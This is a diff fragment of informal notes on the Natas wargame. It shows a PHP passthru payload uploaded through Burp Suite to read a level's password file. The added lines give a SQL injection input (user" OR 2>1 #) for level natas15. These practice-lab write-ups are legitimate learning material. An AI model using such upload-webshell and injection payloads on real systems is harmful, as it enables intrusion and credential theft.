@@ -154,4 +154,15 @@ but use burpsuit and add this command at the end
 <?php echo passthru('cat /etc/natas_webpass/natas14') ?>
 after that change first of the png or gpeg to php
 thats done
+
+------------------------------------------------------------------------------------------------------------------------------------------
+
+natas15
+
+so easy
+simple sql injection
+user >>>>
+user" OR 2>1 #
+and a random pas
+
 ------------------------------------------------------------------------------------------------------------------------------------------
